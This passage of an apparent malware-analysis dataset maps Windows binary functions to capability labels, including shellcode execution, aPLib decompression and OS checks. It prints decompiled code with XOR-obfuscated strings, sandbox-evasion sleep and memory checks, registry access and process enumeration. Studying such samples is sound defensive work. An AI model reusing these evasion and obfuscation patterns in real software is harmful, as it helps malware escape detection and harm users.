        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004046b2(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    uint uStack1392;\n    uint uStack1388;\n    uchar *puStack1384;\n    uchar *puStack1380;\n    uchar *puStack1364;\n    uchar *puStack1356;\n    uchar *puStack1352;\n    uint uStack1348;\n    int32_t iStack1344;\n    uint32_t uStack1340;\n    uint uVar13;\n    uint uStack1316;\n    int32_t iStack1312;\n    uchar uStack1308;\n    uchar uStack1307;\n    ushort uStack1306;\n    ushort uStack1304;\n    ushort uStack1302;\n    ushort uStack1300;\n    ushort uStack1298;\n    uchar uStack1296;\n    uchar uStack1295;\n    ushort uStack1294;\n    uint8_t auStack1288 [4];\n    uint uStack1284;\n    uint uStack1280;\n    uint uStack1276;\n    uint uStack1272;\n    uint32_t uStack1268;\n    uint uStack1264;\n    uint uStack1260;\n    uint uStack1256;\n    uint uStack1252;\n    uint uStack1248;\n    uint uStack1244;\n    uint uStack1240;\n    uint uStack1236;\n    uint uStack1232;\n    uint uStack1228;\n    uint uStack1224;\n    uint uStack1220;\n    uint uStack1216;\n    uint uStack1212;\n    uint uStack1208;\n    uint uStack1204;\n    uint uStack1200;\n    uint uStack1196;\n    ushort uStack1192;\n    uchar auStack1188 [4];\n    int32_t iStack1184;\n    uint32_t uStack1172;\n    int32_t iStack1168;\n    uint uStack1156;\n    int32_t iStack1152;\n    uint uStack1144;\n    uchar auStack1136 [16];\n    uchar auStack1120 [12];\n    uchar auStack1108 [4];\n    int16_t iStack1104;\n    uchar auStack1102 [10];\n    uchar auStack1092 [12];\n    uchar auStack1080 [12];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    uStack1144 = 0x200;\n    uStack1308 = 0x3c;\n    uStack1307 = 0x33;\n    uStack1306 = 0x163b;\n    uStack1304 = 0x2e34;\n    uStack1302 = 0x7851;\n    puVar12 = &stack0xfffffbf8;\n    for (iVar8 = 0x400; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    uStack1300 = 0x3279;\n    uStack1298 = 0x1425;\n    puVar12 = &stack0xfffffb90;\n    for (iVar8 = 0x40; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    uStack1296 = 0x51;\n    puVar12 = &stack0xfffffbd4;\n    for (iVar8 = 0x24; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    uStack1316 = 0x78495657;\n    iStack1312 = 0x4a624251;\n    fcn.00401000(0xd);\n    uStack1272 = 0;\n    uVar10 = 0;\n    do {\n        puVar1 = uVar10 + iStack1152;\n        uVar4 = uVar10 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar10 = uVar10 + 1;\n        *puVar1 = (&stack0xfffffad8)[uVar4] ^ puVar1[&stack0xfffffae0 + -iStack1152];\n    } while (uVar10 < 0xd);\n    iStack1312 = 0x36333f12;\n    uStack1308 = 0x57;\n    uStack1268 = 7;\n    uStack1307 = 7;\n    uStack1306 = 0x273f;\n    uStack1304 = 0x930;\n    uStack1302 = 0xb3e;\n    uStack1300 = 0x1642;\n    uStack1298 = 0x183b;\n    uStack1296 = 0x3b;\n    uStack1295 = 0x3c;\n    uStack1294 = 0x7828;\n    uStack1316 = 0x51567336;\n    uStack1340 = 0x4047b6;\n    fcn.00401000(0x14);\n    uVar10 = 0;\n    do {\n        puVar1 = uVar10 + uStack1268;\n        uVar4 = uVar10 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar10 = uVar10 + 1;\n        *puVar1 = (&stack0xfffffad4)[uVar4] ^ puVar1[&stack0xfffffadc + -uStack1268];\n    } while (uVar10 < 0x14);\n    uStack1340 = uStack1268;\n    iStack1344 = iStack1152;\n    uStack1348 = 0x4047ea;\n    uStack1348 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    puStack1352 = 0x4047f1;\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack1156 = 0x40;\n    puStack1352 = &stack0xfffffb7c;\n    puStack1356 = 0x40480c;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    puStack1356 = &stack0xfffffbbc;\n    if (pcVar5 == NULL) {\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        (*pcVar5)();\n    }\n    uStack1284 = 0x4800452b;\n    iVar8 = 0;\n    uStack1280 = 0x63034d19;\n    uStack1276 = 0x6b296132;\n    uStack1272 = 0x4506673f;\n    uStack1268 = 0x4d2f483d;\n    uStack1264 = 0x61166322;\n    uStack1260 = 0x671f6b0b;\n    uStack1256 = 0x4831452a;\n    uStack1252 = 0x632e4d3f;\n    uStack1248 = 0x6b06610a;\n    uStack1244 = 0x45306711;\n    uStack1240 = 0x4d184818;\n    uStack1236 = 0x61206313;\n    uStack1232 = 0x67116b25;\n    uStack1228 = 0x48044520;\n    uStack1224 = 0x63134d05;\n    uStack1220 = 0x6b296137;\n    uStack1216 = 0x45336721;\n    uStack1212 = 0x4d044813;\n    uStack1208 = 0x61206304;\n    uStack1204 = 0x673e6b3b;\n    uStack1200 = 0x4813450c;\n    uStack1196 = 0x63574d37;\n    uStack1192 = 0x6145;\n    iStack1344 = 0x48614563;\n    uStack1340 = uStack1340 & 0xff000000 | 0x674d6b;\n    puStack1364 = 0x404929;\n    fcn.00401000(0xbc);\n    do {\n        puVar1 = iVar8 + iStack1184;\n        iVar11 = iVar8 % CONCAT22(uStack1294, CONCAT11(uStack1295, uStack1296));\n        iVar8 = iVar8 + 1;\n        *puVar1 = (&stack0xfffffabc)[iVar11] ^ puVar1[&stack0xfffffaf8 + -iStack1184];\n    } while (iVar8 < 0x5e);\n    puStack1364 = &stack0xfffffb5c;\n    iVar8 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)();\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    uVar13 = CONCAT22(uStack1302, uStack1304);\n    if (iVar8 == 0) {\n        puStack1352 = 0x6d1a3761;\n        uStack1348 = 0x56064f59;\n        iStack1344 = 0x6d1b3754;\n        uStack1340 = 0x560a4f45;\n        uVar13 = 0x56084f57;\n        uStack1316 = 0x56654f51;\n        puStack1356 = 0x56654f36;\n        puStack1380 = 0x4049e2;\n        fcn.00401000(0x50);\n        iVar8 = iStack1312;\n        uVar10 = 0;\n        do {\n            puVar1 = uVar10 + iStack1312;\n            uVar4 = uVar10 & 0x80000007;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n            }\n            uVar10 = uVar10 + 1;\n            *puVar1 = (&stack0xfffffaac)[uVar4] ^ puVar1[&stack0xfffffab4 + -iStack1312];\n        } while (uVar10 < 0x28);\n        puStack1380 = &stack0xfffffb58;\n        puStack1384 = &stack0xfffffbc8;\n        uStack1388 = 0;\n        uStack1392 = 0;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(uStack1204, iStack1312);\n        piVar9 = &stack0xfffffbb0;\n        do {\n            iVar2 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar2 != uStack1340);\n        if (piVar9 - &stack0xfffffbb2 >> 1 != 0) {\n            puStack1380 = 0x68156b22;\n            uStack1388 = 0x68706b7a;\n            puStack1384 = 0x54694641;\n            fcn.00401000(0x14);\n            iVar11 = iStack1344;\n            uVar10 = 0;\n            do {\n                puVar1 = uVar10 + iStack1344;\n                uVar4 = uVar10 & 0x80000007;\n                if (uVar4 < 0) {\n                    uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                }\n                uVar10 = uVar10 + 1;\n                *puVar1 = (&stack0xfffffa90)[uVar4] ^ puVar1[&stack0xfffffa98 + -iStack1344];\n            } while (uVar10 < 10);\n            iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffbac, iStack1344);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            while (iVar6 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffba0, iVar11);\n            }\n            uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n            (*pcVar5)(uVar7);\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack1228);\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        (*pcVar5)(uVar7);\n    }\n    if ((iStack1168 == 0) && (uStack1172 < 1200000000)) {\n        do {\n            puStack1380 = 0x404b52;\n            (*_sym.imp.KERNEL32.dll_Sleep)();\n            if (iStack1168 != 0) break;\n        } while (uStack1172 < 1200000000);\n        uVar13 = CONCAT22(uStack1302, uStack1304);\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    puStack1380 = NULL;\n    puStack1384 = 0x404b78;\n    puStack1384 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack1388 = 0x404b7b;\n    (*pcVar5)();\n    uStack1392 = 0;\n    uStack1388 = uVar13;\n    uVar13 = (*pcVar3)();\n    (*pcVar5)(uVar13);\n    uVar13 = (*pcVar3)(0, uStack1216);\n    (*pcVar5)(uVar13);\n    return;\n}\n",
        "token_count": 3207
    },
    "0040bb8c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __fastcall fcn.0040bb8c(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    int32_t iVar2;\n    uint unaff_EDI;\n    ushort *puVar3;\n    uint *puVar4;\n    ushort *puVar5;\n    uint16_t uVar6;\n    ushort uStack128;\n    ushort uStack126;\n    uint uStack124;\n    ushort uStack120;\n    ushort uStack118;\n    ushort uStack116;\n    ushort uStack114;\n    uint uStack112;\n    uint32_t uStack108;\n    uint uStack104;\n    uint32_t uStack100;\n    uint uStack96;\n    uint uStack92;\n    ushort *puStack88;\n    uint32_t uStack84;\n    ushort uStack74;\n    uint uStack72;\n    uint uStack68;\n    uint uStack60;\n    ushort uStack56;\n    \n    uVar6 = unaff_EDI >> 0x10;\n    puVar5 = &uStack116;\n    uStack128 = unaff_EBX;\n    uStack126 = unaff_EBX >> 0x10;\n    uStack120 = 0;\n    uStack118 = 0;\n    iVar1 = (**(*param_1 + 0xc))(param_1, &uStack120, puVar5);\n    if (-1 < iVar1) {\n        uStack124 = 0;\n        uStack120 = 0;\n        uStack118 = 0;\n        (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)();\n        iVar2 = CONCAT22(uStack126, uStack128) + 3000000000;\n        uStack124 = uStack124 + (0x4d2fa1ff < CONCAT22(uStack126, uStack128));\n        puVar3 = &uStack128;\n        for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        puVar4 = &uStack104;\n        for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        uStack128 = iVar2;\n        uStack126 = iVar2 >> 0x10;\n        (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)(&uStack128, &uStack104);\n        uStack128 = 0;\n        uStack96 = uStack112;\n        uStack92 = uStack108;\n        puStack88 = uStack104;\n        uStack84 = uStack100;\n        uStack126 = 0;\n        uStack124 = 0;\n        uStack120 = 0;\n        uStack118 = 0;\n        uStack116 = 0;\n        uStack114 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_SystemTimeToTzSpecificLocalTime)(0, &uStack96, &uStack128);\n        if (-1 < iVar1) {\n            sub.ntdll.dll_memset(&uStack92 + 2, 0, 0x2e);\n            uStack72 = 0x5a0;\n            uStack92 = uStack92 & 0xffff0000 | 0x30;\n            uStack84 = uStack84 & 0xffff0000 | uVar6;\n            uStack74 = 0;\n            uStack60 = 1;\n            uStack56 = 1;\n            uStack68 = 1;\n            puStack88 = puVar5;\n            iVar2 = (**(uStack124 + 0xc))(&uStack124, &uStack92);\n            iVar1 = 0;\n            if (iVar2 < 0) {\n                iVar1 = iVar2;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 899
    },
    "004037a5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004037a5(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 236
    },
    "0040a778": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040a778(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 151
    },
    "00408dcc": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00408dcc(code *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t dwSize;\n    \n    pcVar1 = _sym.imp.ntdll.dll_NtQuerySystemInformation;\n    dwSize = 0;\n    iVar2 = (*_sym.imp.ntdll.dll_NtQuerySystemInformation)(5, 0, 0, &dwSize);\n    if (iVar2 == -0x3ffffffc) {\n        dwSize = dwSize + 0x100;\n        piVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n        if (piVar3 != NULL) {\n            iVar2 = (*pcVar1)(5, piVar3, dwSize, 0);\n            piVar6 = piVar3;\n            if (-1 < iVar2) {\n                do {\n                    iVar2 = piVar6[0x11];\n                    if (((iVar2 != 0) && (iVar2 != 4)) && (iVar2 != *0x41bd34)) {\n                        uVar4 = fcn.00409365();\n                        uVar5 = fcn.004068eb();\n                        iVar2 = (*param_1)(piVar6[0xf], uVar5, piVar6[0x11], piVar6[0x12], uVar4, param_2);\n                        if (iVar2 == 0) {\ncode_r0x00408e92:\n                            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar3, 0, 0x8000);\n                            return 0;\n                        }\n                    }\n                    if (*piVar6 == 0) goto code_r0x00408e92;\n                    piVar6 = piVar6 + *piVar6;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar3, 0, 0x8000);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 505
    },
    "00403f8c": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00403f8c(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    do {\n        iVar1 = fcn.004038a4(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.0040b172();\n    }\n    return iVar1;\n}\n",
        "token_count": 183
    },
    "00403fd8": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00403fd8(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_3ch;\n    uint var_38h;\n    uint var_31h;\n    uchar var_2dh;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1bh;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t lpModuleName;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    puVar9 = &var_2ch;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_24h = 0x201d3d2b;\n    var_4h = 7;\n    var_20h._0_1_ = 7;\n    var_20h._1_1_ = 0x6b;\n    var_20h._2_1_ = 0x1c;\n    stack0xffffffdf = 0x2529;\n    var_1bh = 0x79;\n    var_14h = 0x4c794945;\n    var_10h._0_2_ = 0x456b;\n    var_10h._2_1_ = 0x78;\n    fcn.00401000(10);\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + lpModuleName;\n        iVar7 = iVar6 % var_4h;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_14h + iVar7) ^ puVar1[&var_24h - lpModuleName];\n    } while (iVar6 < 10);\n    var_3ch = 0x12081801;\n    var_38h._0_2_ = 0x5e59;\n    var_38h._2_1_ = 7;\n    stack0xffffffc7 = 0x12011826;\n    var_31h = 0x61445044;\n    var_2dh = 0x6c;\n    var_24h = 0x51646c53;\n    var_20h._0_1_ = 0x36;\n    var_20h._1_1_ = 0x33;\n    var_20h._2_1_ = 0x77;\n    fcn.00401000(0x10);\n    iVar6 = var_14h;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + var_14h;\n        iVar8 = iVar7 % var_4h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_24h + iVar8) ^ puVar1[&var_3ch - var_14h];\n    } while (iVar7 < 0x10);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, var_14h);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    cVar3 = fcn.0040ac4d();\n    if (cVar3 != '\\0') {\n        var_ch = (*pcVar5)(0, var_28h, var_2ch);\n    }\n    fcn.0040b172();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar2)(0, lpModuleName);\n    (*pcVar5)(uVar4);\n    return var_ch;\n}\n",
        "token_count": 956
    },
    "0040439a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040439a(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint noname_0;\n    code *pcVar8;\n    code *pcVar9;\n    int32_t iVar10;\n    uint noname_0_00;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    pcVar8 = _sym.imp.ntdll.dll_RtlRandom;\n    var_ch = 0;\n    var_4h = *0x41bcc0;\n    (*_sym.imp.ntdll.dll_RtlRandom)(0x41bcc0);\n    uVar2 = (*pcVar8)(0x41bcc0);\n    iVar3 = fcn.0040410c(uVar2 & 0xff, 0x41bcc0, 0x41bd20, &var_8h);\n    if (iVar3 == 0) {\n        return var_ch;\n    }\n    iVar3 = fcn.0040410c(0, 0x41bcc0, 0x41bd24, &var_8h);\n    if (iVar3 == 0) {\n        return var_ch;\n    }\n    var_24h = 0x5514391b;\n    var_20h = 0x430d464f;\n    var_1ch._0_2_ = 0x3935;\n    var_18h = 0x55713935;\n    var_14h = 0x43684637;\n    fcn.00401000(0x14);\n    iVar3 = var_10h;\n    uVar2 = 0;\n    do {\n        puVar1 = uVar2 + var_10h;\n        uVar4 = uVar2 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar2 = uVar2 + 1;\n        *puVar1 = *(&var_18h + uVar4) ^ puVar1[&var_24h - var_10h];\n    } while (uVar2 < 10);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x41bd24, var_10h);\n    iVar5 = fcn.0040410c(0, 0x41bcc0, 0x41bd1c, &var_8h);\n    if ((iVar5 == 0) || (var_14h = fcn.004088c9(noname_0, 0),  var_14h == 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        return var_ch;\n    }\n    var_4h = var_4h ^ 0x29787279;\n    var_34h = 0x641e4b3d;\n    var_30h = 0x322c3330;\n    var_2ch = 0x642d4b1d;\n    var_28h._0_2_ = 0x3353;\n    var_24h = 0x64714b71;\n    var_20h = 0x324d3353;\n    fcn.00401000(0x1c);\n    iVar5 = var_10h;\n    uVar2 = 0;\n    do {\n        puVar1 = uVar2 + var_10h;\n        uVar4 = uVar2 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar2 = uVar2 + 1;\n        *puVar1 = *(&var_24h + uVar4) ^ puVar1[&var_34h - var_10h];\n    } while (uVar2 < 0xe);\n    uVar6 = 1;\n    *0x41bd18 = fcn.004088c9(puVar1, 1);\n    if (*0x41bd18 != 0) {\n        noname_0_00 = 1;\n        var_10h = fcn.004088c9(uVar6, 1);\n        if (var_10h != 0) {\n            *0x41bd14 = fcn.004088c9(noname_0_00, 1);\n            iVar10 = *0x41bd14;\n            if (*0x41bd14 != 0) {\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar7 = fcn.0040410c(0, &var_4h, 0x41bd10, &var_8h);\n                iVar10 = 0;\n                if (iVar7 != 0) {\n                    var_ch = 1;\n                }\n            }\n            pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(iVar10, iVar5);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n            uVar6 = (*pcVar9)(0, iVar3);\n            (*pcVar8)(uVar6);\n            iVar3 = var_10h;\n            goto code_r0x004045d5;\n        }\n    }\n    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\ncode_r0x004045d5:\n    uVar6 = (*pcVar9)(0, iVar3);\n    (*pcVar8)(uVar6);\n    uVar6 = (*pcVar9)(0, var_14h);\n    (*pcVar8)(uVar6);\n    return var_ch;\n}\n",
        "token_count": 1493
    },
    "00406eba": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00406eba(uchar *param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    int32_t iVar10;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar *var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x41bd98 | *0x41bd9c) == 0) || ((*0x41bda0 | *0x41bda4) == 0)) || ((*0x41bda8 | *0x41bdac) == 0)) {\n        var_4h = 0x7f;\n        var_34h._0_2_ = 0x3d2b;\n        var_34h._2_1_ = 0x1d;\n        var_34h._3_1_ = 0x20;\n        var_10h = 7;\n        var_30h._0_1_ = 7;\n        var_30h._1_2_ = 0x1c6b;\n        var_30h._3_1_ = 0x29;\n        var_2ch = 0x25;\n        var_2bh = 0x79;\n        var_24h = 0x4c794945;\n        var_20h._0_2_ = 0x456b;\n        var_20h._2_1_ = 0x78;\n        fcn.00401000(10);\n        iVar8 = var_8h;\n        iVar10 = 0;\n        do {\n            puVar1 = iVar10 + var_8h;\n            iVar5 = iVar10 % var_10h;\n            iVar10 = iVar10 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_34h - var_8h];\n        } while (iVar10 < 10);\n        var_14h = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_8h);\n        if (var_14h == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            return var_4h;\n        }\n        var_34h._0_2_ = 0x273f;\n        var_34h._2_1_ = 7;\n        var_34h._3_1_ = 0x7b;\n        var_30h._0_1_ = 0x17;\n        var_30h._1_2_ = 0x2d26;\n        var_30h._3_1_ = 0x37;\n        var_2ch = 0x2f;\n        var_2bh = 0x19;\n        var_2ah = 0x37;\n        var_24h = 0x37754373;\n        var_20h._0_2_ = 0x4778;\n        var_20h._2_1_ = 0x49;\n        fcn.00401000(0xb);\n        iVar8 = var_1ch;\n        iVar10 = 0;\n        do {\n            puVar1 = iVar10 + var_1ch;\n            iVar5 = iVar10 % var_10h;\n            iVar10 = iVar10 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_34h - var_1ch];\n        } while (iVar10 < 0xb);\n        *0x41bd98 = fcn.00409606();\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        *0x41bd9c = *0x41bd98 >> 0x1f;\n        if ((*0x41bd98 | *0x41bd9c) == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar7)(0, var_8h);\n            (*pcVar2)(uVar3);\n            return var_4h;\n        }\n        var_4ch._0_1_ = 0x29;\n        var_4ch._1_1_ = 0x12;\n        var_4ch._2_2_ = 0x3e3c;\n        var_48h._0_2_ = 0x4409;\n        var_48h._2_2_ = 0x502;\n        var_44h._0_2_ = 0x150a;\n        var_44h._2_2_ = 0x1d2b;\n        var_40h._0_2_ = 0x4219;\n        var_40h._2_2_ = 0x3637;\n        var_3ch._0_2_ = 0x1201;\n        var_3ch._2_2_ = 0x1c3c;\n        var_38h._0_2_ = 0x431f;\n        var_38h._2_1_ = 0x52;\n        var_34h._0_2_ = 0x7665;\n        var_34h._2_1_ = 0x4e;\n        var_34h._3_1_ = 0x79;\n        var_30h._0_1_ = 0x6c;\n        var_30h._1_2_ = 0x5230;\n        var_30h._3_1_ = 0x77;\n        fcn.00401000(0x17);\n        uVar6 = 0;\n        do {\n            puVar1 = uVar6 + var_ch;\n            uVar4 = uVar6 & 0x80000007;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n            }\n            uVar6 = uVar6 + 1;\n            *puVar1 = *(&var_34h + uVar4) ^ puVar1[&var_4ch - var_ch];\n        } while (uVar6 < 0x17);\n        *0x41bda0 = fcn.00409606();\n        *0x41bda4 = *0x41bda0 >> 0x1f;\n        if ((*0x41bda0 | *0x41bda4) == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n            pcVar7 = 